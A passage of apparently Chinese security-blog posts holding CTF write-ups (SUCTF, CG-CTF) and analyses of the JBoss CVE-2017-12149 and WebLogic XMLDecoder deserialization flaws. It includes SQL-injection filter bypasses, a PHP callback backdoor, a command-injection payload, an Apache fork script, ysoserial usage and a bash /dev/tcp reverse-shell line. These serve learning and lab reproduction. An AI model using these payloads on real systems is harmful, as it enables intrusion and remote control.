&quot;class.php&quot;;define(&quot;KEY&quot;,&quot;8690475385984657&quot;);define(&quot;method&quot;,&quot;aes-128-cfb&quot;);define(&quot;BS&quot;,16);define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);function get_token()&#123; $token = &apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $token .= chr(rand(1,255)); &#125; return $token;&#125;function enc($s)&#123; $token = get_token(); $code1 = openssl_encrypt(string($s),method,key,OPENSSL_RAW_DATA,$token); $code2 = base64_encode(base64_encode($token.&quot;-&quot;.$code1)); return $code2;&#125;function dec($s)&#123; if($cc = base64_decode(base64_decode($s))) &#123; if($iv = substr($cc,0,16)) &#123; if($d = substr($cc,17)) &#123; if($s = openssl_decrypt($d, method, key, OPENSSL_RAW_DATA,$iv)) &#123; return $s; &#125; else die(&quot;error&quot;); &#125; else return 0; &#125; else return 0; &#125; else return 0;&#125;function uploadImage()&#123; if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123; die(&quot;Auth Failed&quot;); &#125; $AllowedType = array( &quot;png&quot;, &quot;gif&quot;, &quot;jpg&quot; ); $filename = $_FILES[&apos;file&apos;][&apos;name&apos;]; $filesize = $_FILES[&apos;file&apos;][&apos;size&apos;]; if($filesize &gt; 1000000)&#123; exit(&quot;Too large&quot;); &#125; $fileext = substr($filename, strrpos($filename, &apos;.&apos;)+1); if(in_array($fileext,$AllowedType))&#123; $file = &quot;thumbs/images/&quot;.md5(time().&quot;admin&quot;).&quot;.&quot;.$fileext; if(file_exists($file))&#123; exit(&quot;File existed already&quot;); &#125;else&#123; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$file); &#125; &#125;else&#123; exit(&quot;Not Allowed Ext&quot;); &#125;&#125;function viewImage($name)&#123; if($_SESSION[&apos;auth&apos;] !== &quot;admin&quot;)&#123; die(&quot;Auth Failed&quot;); &#125; new ImageView($name);&#125;function showImage()&#123; $obj = new Home(&quot;thumbs/images/&quot;); $obj-&gt;showImg();&#125;function to($str) &#123; return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));&#125;function re($str) &#123; return substr($str, 0, -ord(substr($str, -1, 1)));&#125;function getkey()&#123; return KEY;&#125;function get_identify()&#123; return IDENTIFY;&#125;function encrypt($str)&#123; $key = getkey(); srand(time() / 300); $token = get_token(); $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token)); return base64_encode($cipher);&#125;function decrypt($str)&#123; $decode = base64_decode($str); $key = getkey(); srand(time() / 300); $token = get_token(); $bin = hex2bin($str); $plain = re(mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$bin , MCRYPT_MODE_CFB, $token)); return $plain;&#125; class.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2018/2/2 * Time: 下午11:00 */class ImageView&#123; private $filename = &quot;&quot;; function __construct($name)&#123; $this-&gt;filename = &quot;images/$name&quot;; $this-&gt;createThumbnail(); &#125; function createThumbnail()&#123; $e = stripcslashes(preg_replace(&apos;/[^0-9\\\]/&apos;,&apos;&apos;,isset($_GET[&apos;size&apos;])?$_GET[&apos;size&apos;]:25)); system(&quot;/usr/bin/convert &#123;$this-&gt;filename&#125; --resize $e ./thumbs/&#123;$this-&gt;filename&#125;&quot;); &#125; function __toString() &#123; // TODO: Implement __toString() method. return &quot;&lt;a href=&#123;$this-&gt;filename&#125;&gt; &lt;img src=./thumbs/&#123;$this-&gt;filename&#125;&gt;&lt;/a&gt;&quot;; &#125;&#125;class Home&#123; private $dir = &quot;&quot;; public function __construct($dir)&#123; $this-&gt;dir = $dir; &#125; public function showImg()&#123; $files = $this-&gt;getDirFile($this-&gt;dir); foreach ($files as $file)&#123; echo &quot;&lt;img src=$file&gt;&quot;; &#125; &#125; public function getDirFile($dir)&#123; $files = array(); if(!is_dir($dir)) &#123; return $files; &#125; $handle = opendir($dir); if($handle) &#123; while(false !== ($file = readdir($handle))) &#123; if ($file != &apos;.&apos; &amp;&amp; $file != &apos;..&apos;) &#123; $filename = $dir . &quot;/&quot; . $file; if(is_file($filename)) &#123; $files[] = $filename; &#125;else &#123; $files = array_merge($files, get_files($filename)); &#125; &#125; &#125; // end while closedir($handle); &#125; return $files; &#125;&#125; admin.php 123456789101112131415&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2018/2/2 * Time: 下午9:38 */session_start();if($_SESSION[&apos;auth&apos;]!==&quot;admin&quot;)&#123; die(&quot;Auth Failed!&quot;);&#125;include &quot;func.php&quot;;if(isset($_GET[&apos;action&apos;]))&#123; $action = $_GET[&apos;action&apos;]; if($action == &quot;uploadImage&quot;)&#123; include_once &quot;template/upload.php&quot;; if(isset($_FILES[&apos;file&apos;]))&#123; uploadImage(); &#125; &#125;elseif ($action == &quot;viewImage&quot;)&#123; $file = isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;23.jpg&quot;; viewImage($file); &#125;&#125; 先看index.php，这里会将$token解密，如果$admin==3就有权限访问admin.php，我们在本地生成加密 token token的加密脚本 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpdefine(&quot;KEY&quot;,&quot;8690475385984657&quot;);define(&quot;method&quot;,&quot;aes-128-cfb&quot;);define(&quot;BS&quot;,16);define(&quot;IDENTIFY&quot;,&quot;9850375038&quot;);function getkey()&#123; return KEY;&#125;function get_identify()&#123; return IDENTIFY;&#125;function get_token()&#123; $token = &apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $token .= chr(rand(1,255)); &#125; return $token;&#125;function to($str) &#123; return $str . str_repeat(chr(BS - strlen($str) % BS), (BS - strlen($str) % BS));&#125;function encrypt($str)&#123; $key = getkey(); srand(time() / 300); $token = get_token(); $cipher = bin2hex(mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, to($str), MCRYPT_MODE_CFB, $token)); return base64_encode($cipher);&#125;$username = &apos;qwer&apos;;$md5 = md5(get_identify().$username);$admin = &apos;3&apos;;$token = encrypt($username . &apos;|&apos; . $admin . &apos;|&apos; . $md5);echo $md5;echo &quot;\n&quot;echo $token;echo &quot;\n&quot;; 这个指定admin为3，生成一个token windows 跟 linux 的随机数是有差异的 ，所以脚本要拉到linux环境中执行。 拿到了sign和token，访问http://45.76.173.177:23333/?sign=30dd01f4a4aeb5598d20ce3084e120a5&amp;token=YmMxNWI3MzY5MmFjZTA0NzExMzQwMjBhMDNiNGFhODYyZWVjNDQ1ZWY5NjI4ZDQ5NWI3YWE4OGFhNmZkNTg2OWQ0ZTdmYjg4ZTVlMjQ4Mjg5N2JhNWY5NDJjM2FjYzI4 拿到管理员权限后接着看admin.php，文件上传好像是因为没有目录权限，一直上传不上东西，就算了。viewImage调用了ImageView类，最终通过调用系统命令的方式修改图片大小，这里没有对$filename进行过滤，直接拼接到命令执行中，构造 payload 执行命令 接下来就是寻找flag之旅了，最后发现flag在/etc/目录下 获得flag！ 补充一下审计admin.php源码的过程： 跟进viewImage 跟进ImageView 这里可以命令执行 file的地方就可以传进去命令 36. Anonymous这道题学到了很有意思的知识！ 1234Anonymous 匿名的PHP是最好的语言，不是吗？// SUCTF 2018，出题人：梅子酒//题目地址 http://45.76.173.177:23334/ 根据题目可能是考php匿名函数 先看代码 12345678910111213&lt;?php$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash()&#123;&quot; .&quot;global \$MY;&quot; .&quot;\$MY();&quot; .&quot;&#125;&quot;);if(isset($_GET[&apos;func_name&apos;]))&#123; $_GET[&quot;func_name&quot;](); die();&#125;show_source(__FILE__); 先学习一下匿名函数的创建create_function()： string create_function (string $args, string $cod) string $args：变量部分 string $code：方法代码部分 一个官方提供的例子： 123456789&lt;?php$newfunc = create_function(&apos;$a,$b&apos;, &apos;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&apos;);echo &quot;New anonymous function: $newfunc&quot;;echo $newfunc(2, M_E);// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599// M_E 是 php 中常量 e 的表示形式?&gt; 顺便学习一下利用create_function()进行代码注入 1234567891011121314&lt;?php$a=$_GET[&apos;id&apos;];$b=&apos;echo&apos;.$a.&quot;;&quot;;$f=create_function(&apos;$a&apos;,$b); /* 参数 &apos;$a&apos; $b 函数体$f($a);?&gt;这个匿名函数相当于这样的创建函数过程:function niming($a)&#123; echo $id.&apos;is&apos;.$a;&#125;payload:?id=1;&#125;phpinfo();/*可以看到phpinfo的信息； 回到这道题，了解一下本题代码中的几个函数 bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。 openssl_random_pseudo_bytes 函数根据参数来生成指定个数的随机字节。 die() 函数输出一条消息，并退出当前脚本。 这道题用到的知识点是： 匿名函数的名字和apache的Pre-fork模式 Apache的默认模式Pre-fork会随着请求数量的增加而启动若干新的进程 。 create_function创建的是匿名函数，而匿名函数也是有名字的，名字是\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数。%d会从1一直进行递增，表示这是当前进程中第几个匿名函数。因此如果开启一个新的php进程，那么这个匿名函数就是\x00lambda_1，所以思路就是通过向Pre-fork模式的apache服务器发送大量请求，致使apache开启新的进程来处理请求，那么传递func_name=%00lambda_1就可以执行函数了。 经过了解以上知识，我写了一个超级简单无脑的python脚本跑了一下就跑出来了flag，就是一直传递func_name=%00lambda_1参数向服务器发起请求，然后直到服务器启动了新的进程这个请求就可以获取flag了。 把url改一下就可以了。这道题改编自HITCON2017的一道web题，只考察了后半部分的知识点，原题orange师傅给出的官方writeup中的poc如下： fork.py 123456789101112131415161718192021import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = &apos;x.x.x.x&apos; PORT = 80 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(&apos;GET / HTTP/1.1\nHost:web.suctf.asuri.org:81\nConnection: Keep-Alive\n\n&apos;) # s.close() print &apos;ok&apos; time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run,range(i) ).get(0xffff) 我在本地也复现了一下 步骤如下： 123456789exp:# get a cookie$ curl &apos;http://host/&apos; --cookie-jar cookie# force apache to fork new process$ python fork.py# get flag$ curl -b cookie &quot;http://host:port/?func_name=%00lambda_1&quot; 总结终于，经过三天做题两天整理，自己好像摸到了些ctf的门槛，虽然还很菜，关于ctf的下一步可能先去学学隐写术再来刷题。 这些天来学到了很多以前没想过的姿势，也回顾了许多忘了差不多的常见漏洞绕过姿势，都做完之后真的成就感爆棚。 希望能给看这篇文章的你带去一些帮助，要是师傅们发现疏漏了还请快指正我！ 教室有些嘈杂，那些嘈杂此时入耳，仿佛成了我心中的白月光。 Reference南邮CTF-WEB-writeup SUCTF web题目 writeup HITCON2017-writeup整理 hitcon-ctf-2017 orange官方writeup]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CG-CTF 综合题(2) writeup]]></title>
    <url>%2F2018%2F11%2F13%2FCG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup%2F</url>
    <content type="text"><![CDATA[前言这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。 刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。 这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。 - 南邮CTF训练平台：https://cgctf.nuptsast.com/ - 题目地址：http://cms.nuptzj.cn/ 信息搜集进入这道题发现是一个客户留言板，在想会不会是XSS，往下看有个链接 “本CMS说明”，点进去看看。 看一下url:cms.nuptzj.cn/about.php?file=index.php 可能存在文件包含，用来读取提示的那些文件的代码。 网上看到一个下载提示文件的python代码 123456789101112131415161718import requestsimport codecsfrom bs4 import BeautifulSoupurl=&quot;http://cms.nuptzj.cn/about.php?file=&quot;file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;say.php&quot;,&quot;config.php&quot;,&quot;antixss.php&quot;,&quot;about.php&quot;,&quot;so.php&quot;,&quot;antiinject.php&quot;,&quot;xlcteam.php&quot;]for i in file_list: res = requests.get(url+i) print(&quot;dowload &quot;+i) if res.status_code==200: res.encoding=&quot;utf8&quot; with codecs.open(i,&quot;w+&quot;,&quot;utf8&quot;) as handle: print(&quot;done&quot;) text = BeautifulSoup(res.text,&quot;lxml&quot;).text handle.write(text)---------------------作者：mylyylmy来源：CSDN原文：https://blog.csdn.net/mylyylmy/article/details/79885143 其实也可以直接在网页看代码。 还提示了数据库表结构，所以推测是用sql注入获取账号密码，那我们还要找到后台页面才行。 先通过读源码获取信息 从passencode.php看出将用户的密码存储为了ASCii码格式 其他的提示php文件代码中也没发现什么，这时突然想起没有读这个about.php本身的代码 1234567891011121314&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;?php $file = $_GET[&apos;file&apos;]; if ($file == &quot;&quot; || strstr($file, &apos;config.php&apos;)) &#123; echo &quot;file参数不能为空！&quot;;exit(); &#125; else &#123; $cut = strchr($file, &quot;loginxlcteam&quot;); if ($cut == false) &#123; $data = file_get_contents($file); $date = htmlspecialchars($data); echo $date;&#125; else &#123;echo &quot;&lt;script&gt;alert(&apos;敏感目录，禁止查看！但是。。。&apos;)&lt;/script&gt;&quot;; &#125; &#125; 从中发现了敏感目录 loginxlcteam，看名字应该就是后台登陆页面了，直接打开 接下来要找sql注入的位置了，回到首页发现有个留言搜索(输入ID)的位置，应该会传参数，输入个1，点搜索到了这个页面 根据提示信息，应该是User-Agent头信息不满足 用前文的文件包含看一下so.php的源码 发现了User-Agent头应该设置为 Xlcteam Browser， 发现了构造的sql语句为SELECT * FROM &#39;message&#39; WHERE display=1 AND id=$id 且这个id使用post传递soid参数赋值的 还发现了包含文件 ‘antiinject.php’ 看文件名应该是防sql注入的 SQL注入通过上一步，我们搜集到了sql注入需要的一些信息，这里我们先看一下sql语句的过滤文件antiinject.php 1234567891011121314&lt;?php function antiinject($content) &#123; $keyword = array(&quot;select&quot;, &quot;union&quot;, &quot;and&quot;, &quot;from&quot;, &apos; &apos;, &quot;&apos;&quot;, &quot;;&quot;, &apos;&quot;&apos;, &quot;char&quot;, &quot;or&quot;, &quot;count&quot;, &quot;master&quot;, &quot;name&quot;, &quot;pass&quot;, &quot;admin&quot;, &quot;+&quot;, &quot;-&quot;, &quot;order&quot;, &quot;=&quot;); $info = strtolower($content); for ($i = 0; $i &lt;= count($keyword); $i++) &#123; $info = str_replace($keyword[$i], &apos;&apos;, $info); &#125; return $info; &#125;?&gt; 发现过滤了一些敏感词汇，可以使用双重绕过：SELselectECT =&gt; SELECT 空格也被过滤了，可以使用/**/代表空格 在构造payload时可以使用也被过滤的 “=” 来截断需要使用的敏感词汇 先用order by语句获知列数为4，构造语句查看回显情况 soid=0/**/UNunionION/**/SELselectECT/**/1,2,3,4 构造payload soid=0/**/UNunionION/**/SELselectECT/**/1,usernam=e,userpas=s,4/**/fro=m/**/admi=n 得到后台账户admin及它的ASCII码password 102 117 99 107 114 117 110 116 117 解码得到后台登录密码 fuckruntu 回调函数用拿到的账户密码登录后台发现还没有拿到flag，而是得到了新的信息，网站根目录下已经被上传了小马xlcteam.php 继续用开头的文件包含看源码 12345&lt;?php$e = $_REQUEST[&apos;www&apos;];$arr = array($_POST[&apos;wtf&apos;] =&gt; &apos;|.*|e&apos;,);array_walk($arr, $e, &apos;&apos;);?&gt; 这是个三参数数组回调后门 回调后门利用了php中包含回调函数参数的函数 具体用法可以参考 phith0n师傅在乌云知识库中的文章 创造tips的秘籍——PHP回调后门 在 p师傅 的文章中发现了类似的使用： 这里可以尝试做相同的传参操作 12?www=preg_replacewtf=phpinfo(); 最后使用scandir() 函数列出当前目录下的文件名并打印 12?www=preg_replacewtf=print_r(scandir(&apos;.&apos;)) 得到flag文件名 “恭喜你获得flag2.txt” 用文件包含读取这个文件得到flag！ 总结之前做前面的题时没啥思路总爱看别人的writeup，自己做题时一头雾水，现在好像了解了一些简单的套路。 这道题其实每一步都不是很难，只不过把多个思路结合到一起了，所以对我这种萌新而言蛮耗时间了。 像sql注入那里双写就绕过了，也没有过滤逗号，看到一些师傅在博客上写了脚本，大家可以去参考一下。 做前面的题时还学到了许多其他的知识，这两天做完剩下的几道题就总结一下。 Reference http://www.anquan.us/static/drops/tips-7279.html http://www.zhzzhz.com/recorder/%E5%8D%97%E9%82%AEctf-%E7%BB%BC%E5%90%88%E9%A2%982-writeup.html]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解Java反序列化漏洞(1)]]></title>
    <url>%2F2018%2F11%2F07%2F%E7%90%86%E8%A7%A3Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1%2F</url>
    <content type="text"><![CDATA[0x00 前言这篇博客是对最近以来学习java反序列化漏洞的总结，再由CVE-2017-12149 JBoss 反序列化漏洞和 Webgoat 的分析复现，用到了Burp的插件 Java-Deserialization-Scanner 进而学习了 ysoserial 一个拥有多种不同利用库的Java反序列化漏洞payload生成工具的使用及部分源码分析。 1x00 Java反序列化漏洞1x10 Java序列化与反序列化Java的序列化（Serialize）与反序列化（Deserialize）是对IO流的一种机制。Java序列化的目标是将对象保存到磁盘中或允许在网络中直接传输对象。序列化机制将允许实现序列化的java对象转换成不依赖平台的字节序列，这些字节序列可以保存在磁盘上，或通过网络传输。而Java的反序列化可以把字节序列恢复为Java对象，也就是说序列化将一个Java对象写入IO流中，反序列化从IO流中恢复这个对象，目的是使对象可以脱离Java运行环境，实现多平台之间的通信与持久化存储。 那什么样的对象是允许实现序列化的呢？可序列化类必须实现 Serializable 和 Externalizable 两个接口之一，很多类已经实现了 Serializable ，这个接口是一个标记接口，它只是表示实现它的类是可序列化的。 所有在网上传输的对象的类都应该是可序列化的，主要应用在以下场景： HTTP RMI（Remote Method Invoke 远程方法调用，Java EE 的基础）：是一组维护开发分布式应用程序的API，实现了不同操作系统程序之间的方法调用，其所有传递的参数，返回值都必须实现序列化。 JMX ：JMX是一套标准代理与服务，用户可以在任何Java应用程序中使用它，Weblogic 的管理页面和整个 JBoss 都是基于 JMX 框架。 常用Java序列化与反序列化的方法 123456789#序列化FileOutputStream fos = new FileOutputStream(&quot;file.txt&quot;); //创建一个ObjectOutpuStream() 输出流ObjectOutputStream oos = new ObjectOutputStream(fos);Person test = new SerializableTest(); oos.writeObject(test); //将一个SerializableTest对象输出到输出流中#反序列化FileInputStream fis = new FileInputStream(&quot;file.txt&quot;); //创建一个ObjectInpuStream() 输入流ObjectInputStream ois = new ObjectInputStream(fis);Student st1 = (SerializableTest) ois.readObject(); tips： ObjectOutputStream() 输出流是一个处理流，必须建立在其他节点流的基础之上，这个代码中 ObjectOutputStream() 的输出流建立在一个文件输出流的基础之上 writeObject() 方法将一个对象写入输出流，这时生成了一个”file.txt”的文件，该文件的内容就是 SerializableTest 对象的序列化数据，这里需要注意一点 调用readObject() 方法读取流中的对象，返回一个 Object 类型的 Java 对象，如果程序知道该 Java 对象的类型，可以强制转换 反序列化机制无须通过构造器来初始化 Java 对象 1x20 漏洞成因与影响暴露或间接暴露反序列化 API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码 最为出名的大概应该是：15年的Apache Commons Collections 反序列化远程命令执行漏洞，其当初影响范围包括：WebSphere、JBoss、Jenkins、WebLogic 和 OpenNMSd等。 2016年Spring RMI反序列化漏洞今年比较出名的：Jackson，FastJson 1x30 漏洞原理先介绍一个相关知识 序列化文件头是 ac ed 00 05 ac ed 声明使用了序列化协议 00 05是序列化协议版本 具体的序列化后二进制字节数据含义可以参考 Java序列化机制原理 ac ed 00 05 经过 base64 编码后为 ro0AB 来看一段代码 12345678910111213141516171819202122232425262728293031public class test&#123; public static void main(String args[]) throws Exception&#123; //定义myObj对象 MyObject myObj = new MyObject(); myObj.name = &quot;hi&quot;; //创建一个包含对象进行反序列化信息的”object”数据文件 FileOutputStream fos = new FileOutputStream(&quot;object&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将myObj对象写入object文件 os.writeObject(myObj); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(&quot;object&quot;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 MyObject objectFromDisk = (MyObject)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class MyObject implements Serializable&#123; public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //执行默认的readObject()方法 in.defaultReadObject(); //执行打开计算器程序命令 Runtime.getRuntime().exec(&quot;notepad&quot;); &#125;&#125; 这次我们自己写了一个 class 来进行对象的序列与反序列化。 我们看到，MyObject 类有一个公有属性 name ，myObj 实例化后将 myObj.name 赋值为了 “hi” ，然后序列化写入文件 object 。 查看object文件是以ac ed 00 05开头，序列化成功 反序列化时调用重写的readObject()方法，导致了命令执行，打开了记事本 MyObject 类实现了Serializable接口，并且重写了readObject()函数 ，readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 2x00 CVE-2017-121492x10 漏洞成因这个漏洞出现在 JBoss 的 HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器 doFilter() 方法中，此方法没有进行任何安全检查和过滤就尝试对接受的数据进行反序列化，造成了反序列化漏洞。 源码在jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet目录下的ReadOnlyAccessFilter.class文件中,其中doFilter函数代码如下: 12345678910111213141516171819202122232425262728public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; HttpServletRequest httpRequest = (HttpServletRequest)request; Principal user = httpRequest.getUserPrincipal(); if ((user == null) &amp;&amp; (this.readOnlyContext != null)) &#123; ServletInputStream sis = request.getInputStream(); ObjectInputStream ois = new ObjectInputStream(sis); MarshalledInvocation mi = null; try &#123; mi = (MarshalledInvocation)ois.readObject(); &#125; catch (ClassNotFoundException e) &#123; throw new ServletException(&quot;Failed to read MarshalledInvocation&quot;, e); &#125; request.setAttribute(&quot;MarshalledInvocation&quot;, mi); mi.setMethodMap(this.namingMethodMap); Method m = mi.getMethod(); if (m != null) &#123; validateAccess(m, mi); &#125; &#125; chain.doFilter(request, response); &#125; 可以看到doFilter()方法直接从http请求中获取数据，在没有进行检查或过滤的情况下，尝试调用readobject()方法对数据流进行反序列化操作，因此产生了反序列化漏洞。 影响版本 Jboss AS 5.x Jboss AS 6.x 2x20 分析先使用ysoserial生成序列化payload保存到文件中，然后利用curl命令将内容以POST方式发送到服务器端 ysoserial的用法如下 java -jar ysoserial.jar [payload] &#39;[command]&#39; &gt; poc.ser [payload] ：利用库，根据服务器端程版本不同而不同，若如报错，可尝试更换其他利用库 [command] ：待执行的命令 但实际操作时发现 java -jar ysoserial.jar CommonsCollections1 &quot;touch /tmp/test&quot; &gt; poc.ser 生成的poc 通过 curl http://ip:port/invoker/readonly --data-binary @poc.ser 发送给服务端时，命令正常执行了 可当我想反弹一个shell时，bash -i &gt;&amp; /dev/tcp/127.0.0.1/21 0&gt;&amp;1命令执行失败，因此想对ysoserial工具的源码分析一下。 发现这工具是调用Runtime.getRuntime().exec()方法执行命令，所以先分析一下执行方法的过程，具体生成poc的payload分析之后再学习吧。 判断命令长度不为空，之后先对命令执行了 StringTokenizer() 方法 该方法源码如下 1234567891011121314/** * Constructs a string tokenizer for the specified string. The * tokenizer uses the default delimiter set, which is * &lt;code&gt;&quot;&amp;nbsp;&amp;#92;t&amp;#92;n&amp;#92;r&amp;#92;f&quot;&lt;/code&gt;: the space character, * the tab character, the newline character, the carriage-return character, * and the form-feed character. Delimiter characters themselves will * not be treated as tokens. * * @param str a string to be parsed. * @exception NullPointerException if str is &lt;CODE&gt;null&lt;/CODE&gt; */ public StringTokenizer(String str) &#123; this(str, &quot; \t\n\r\f&quot;, false); &#125; 从StrringTokenizer的部分注释和源码可以看到，StringTokenizer会对/t/n/r/f进行分割，因此我们输入的如下命令 bash -i &gt;&amp; /dev/tcp/127.0.0.1/21 0&gt;&amp;1 会被分割成 1234bash-i&gt;&amp;... 导致命令无法执行，因此我们需要先进行一次base64编码。 tips：在 Webgoat8 中的 Java 反序列化中会直接从用户输入中获取 Base64 的序列化对象，并盲目地反序列化，我们将通过一个序列化对象来利用此漏洞，该对象将出发POP链，以实现 RCE。利用时用到了 Burp 的一个插件 Java-Deserialization-Scanner ，该插件使用时也是基于 ysoserial 工具生成 poc 的。但是在实际利用时需要使用 Hibernate 5 重新编译 ysoserial 的源代码，并对输出 base64 从而生成 payload。ysoserial 源代码的分析我们放到后面在说，由于windows并不自带base64命令，所以需要自己写一个python脚本获取输出之后调用base64实现，可我现在的python水平好像这件事对我来说很麻烦。那怎么办呢！难道要用linux吗？不，通过在线网站 http://jackson.thuraisamy.me/runtime-exec-payloads.html 可以自动生成编码后的代码。 tips：Linux下的${IFS}也可进行编码,${IFS}的hex值是0x20 0x09 0x0a，因此不被分割，可以利用在写shell时的命令中。但是，${IFS}编码后的命令中有空格，文件名中有空格会造成命令解析不完整，写入文件会失败。而在反弹shell命令中，就会导致模糊的重定向错误，所以此处仅作为扩展内容补充说明 2x30 复现这里我们使用了 ysoserial 的 CommonsCollections1 利用库 这里的反弹shell语句是上文在线网站编码后的 netcat 开监听端口 使用curl命令发送请求 curl http://172.16.12.2:8080/invoker/readonly --data-binary @poc.ser 服务器接收到以POST的方式发送的序列化数据，会进行反序列化，执行其中包含的命令，将Shell反弹 3x00 总结对于一个使用了可利用库的Java应用，可以通过审计查找其中的反序列化方法readobject()或者交互式查看流量，寻找是否有序号化数据流(以ac ed 00 05)来查找其输入点，再看有没有进行检查或过滤，最后利用工具ysoserial验证是否存在反序列化漏洞 对Java反序列化有了一些理解，却不够深入。接下来的几篇博客可能不是有关java反序列化的漏洞了，但之后还是要陆陆续续学习一些像ysoserial利用的CommonsCollections和其他一些payload构造源码分析、Java的反射机制等等]]></content>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebLogic XMLDecoder反序列化漏洞]]></title>
    <url>%2F2018%2F11%2F03%2FWebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[前言这是我第一次接触java反序列化漏洞，之前也不会java，调试的过程比较艰辛，其中一些原理其实也没有太清楚，先整理一篇博客回顾一下再继续往下学习吧。CVE-2017-3506 &amp; CVE-2017-10271漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令，攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。 环境搭建直接使用github上vulhub中的docker https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2017-10271 之前我连docker都没用过，参考了这本书入门 Docker—从入门到实践 因为要动态调试，需要开启一个远程调试的端口8053，所以将docker-compose.yml文件改动如下 123456789101112version: &apos;2&apos;services: weblogic: image: vulhub/weblogic ports: - &quot;7001:7001&quot; - &quot;8453:8453&quot; 执行命令 docker-compose up -d 完成搭建，若成功启动，打开浏览器访问http://127.0.0.1:7001应该会出现一个404页面 docker容器搭建完成后，使用命令docker exec -it weblogic /bin/bash 进入容器 修改/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh 文件 找到如下代码段 添加图中的上面两行代码 原来并没有这两行代码 12debugFlag=&quot;true&quot;export debugFlag 添加后运行一下这个脚本，退出并重启容器，这样就开启了debug模式，可以docker ps一下查看容器是否开启了8453端口。 tips：退出容器快捷键 Ctrl+D 因为要远程调试weblogic，而没有源码，所以要把容器中依赖的包拷出来 使用命令docker cp weblogic:/root/Oracle/Middleware/wlserver_10.3 ./WebLogic_jars 这是如果你使用的是windows系统会报错，因为windows对命令行下的路径长度有限制，所以要先进到docker里把要拷的文件夹打个包，再拉下来。 Linux 的打包命令为 zip -r zipname.zip targetdir docker中好像没有zip命令，需要先apt-get install zip一下， 然后再执行zip -r wlserver_10.3.zip wlserver_10.3 这部分jar不全，还要将/root/Oracle/Middleware/modules 拷出来 IDEA远程调试使用idea打开wlserver_10.3，将wlserver_10.3/server/lib和modules这两个文件夹添加到library 添加后，就会发现里面的.jar和.war的包都可以点开了，并且可以搜索里面的一些类和字符串了。 然后开始设置debug，点击Add Configuration... 添加一个Remote设置 端口设置为8453，并且设置Use module classpath 点击debug，出现如下字样，说明已经配置ok。 Connected to the target VM, address: &#39;localhost:8453&#39;, transport: &#39;socket&#39; 在wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class中的handle方法下断点，看看能否击中断点。 以上，就搭建好了docker环境和调试环境，接下来就可以复现和动态调试了。 漏洞复现因为对原理其实也是一知半解，所以先用师傅们的poc复现了一下 现在本地开一个监听端口 nc -l -p 8888 发送如下数据包 tips：/dev/tcp/ 后的ip换成自己的即可 反弹shell成功 查看burp中返回的xml数据，可以清晰的看到调用栈，调用栈在&lt;ns2:frame /&gt;标签中 仔细分析weblogic返回的响应，我们可以大概定位到问题点，我们重点关注&lt;ns2:frame /&gt;标签中class以weblogic开头的部分，这部分就是weblogic处理我们请求的调用栈逻辑，weblogic处理完后就到了XMLDecoder 